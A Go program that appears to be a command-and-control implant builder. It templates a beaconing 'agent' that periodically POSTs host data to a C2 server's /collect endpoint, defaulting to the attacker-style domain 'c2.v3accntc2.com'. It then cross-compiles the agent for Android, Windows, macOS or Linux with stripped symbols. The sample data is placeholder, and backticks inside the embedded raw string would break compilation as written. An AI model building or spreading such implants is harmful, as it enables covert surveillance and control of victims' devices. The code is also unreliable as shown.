package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/template"
)

const agentSrc = `package main
import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"
)
var (
	server   = "{{.C2}}"
	interval = {{.Interval}} * time.Second
)
type payload struct {
	UID     string      `json:"uid"`
	IP      string      `json:"ip"`
	URL     string      `json:"url"`
	UA      string      `json:"ua"`
	Data    interface{} `json:"data"`
	TS      time.Time   `json:"ts"`
}
func main() {
	uid := fmt.Sprintf("%d-%d", os.Getpid(), time.Now().UnixNano())
	for {
		p := payload{
			UID: uid,
			IP:  "0.0.0.0", // server fills real IP
			URL: "http://fake.url",
			UA:  "Android-Agent/1.0",
			Data: map[string]string{"msg": "hello"},
			TS: time.Now(),
		}
		b, _ := json.Marshal(p)
		http.Post(server+"/collect", "application/json", bytes.NewReader(b))
		time.Sleep(interval)
	}
}
`

type config struct {
	C2       string
	Interval int
}

func main() {
	var (
		c2       = flag.String("c2", "https://c2.v3accntc2.com", "C2 base URL (no trailing slash)")
		interval = flag.Int("i", 10, "Beacon interval in seconds")
		goos     = flag.String("os", "android", "Target OS (android, windows, darwin, linux)")
		out      = flag.String("o", "agent", "Output binary path")
	)
	flag.Parse()

	if err := os.MkdirAll(filepath.Dir(*out), 0755); err != nil {
		fmt.Fprintln(os.Stderr, "mkdir:", err)
		os.Exit(1)
	}

	// fill template
	cfg := config{C2: *c2, Interval: *interval}
	t := template.Must(template.New("").Parse(agentSrc))
	f, err := os.Create("agent_tmp.go")
	if err != nil {
		panic(err)
	}
	if err := t.Execute(f, cfg); err != nil {
		panic(err)
	}
	f.Close()
	defer os.Remove("agent_tmp.go")

	// cross-compile
	env := os.Environ()
	env = append(env, "GOOS="+*goos)
	env = append(env, "GOARCH="+archFor(*goos))
	cmd := exec.Command("go", "build", "-ldflags", "-s -w", "-o", *out, "agent_tmp.go")
	cmd.Env = env
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		fmt.Fprintln(os.Stderr, "build:", err)
		os.Exit(1)
	}
	fmt.Println("Agent written to", *out)
}

func archFor(goos string) string {
	switch goos {
	case "android":
		return "arm64"
	case "windows", "darwin", "linux":
		return "amd64"
	default:
		return "amd64"
	}
}
